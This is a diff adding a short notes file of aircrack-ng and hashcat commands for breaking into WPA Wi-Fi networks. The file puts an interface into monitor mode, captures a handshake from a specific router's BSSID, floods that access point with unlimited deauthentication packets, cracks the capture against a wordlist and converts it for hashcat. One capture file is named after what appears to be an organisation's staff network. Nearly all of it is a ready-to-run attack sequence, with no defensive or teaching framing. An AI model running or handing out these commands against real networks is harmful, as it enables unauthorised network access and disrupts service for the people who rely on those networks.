@@ -1,0 +1,24 @@
+airmon-ng check kill
+
+airmon-ng start wlan0
+
+airmon-ng 
+
+airodump-ng wlan0mon
+
+airodump-ng -w /root/Scripts/wpa/hack -c 1 --bssid F0:3F:95:92:2E:18 wlan0mon
+
+aireplay-ng --deauth 0 -a F0:3F:95:92:2E:18 wlan0mon
+
+airmon-ng stop wlan0mon
+
+aircrack-ng ./hack-01.cap -w /usr/share/wordlists/fasttrack.txt 
+
+aircrack-ng ./wpa-01.cap -w /usr/share/wordlists/fasttrack.txt 
+
+aircrack-ng CCESTAFF_1st_Floor.cap /usr/share/wordlists/fasttrack.txt
+
+
+HASHCAT
+
+sudo /usr/share/hashcat-utils/cap2hccapx.bin HUAWEI-F0:3F:95:92:2E:18.cap wpa2.hccapx
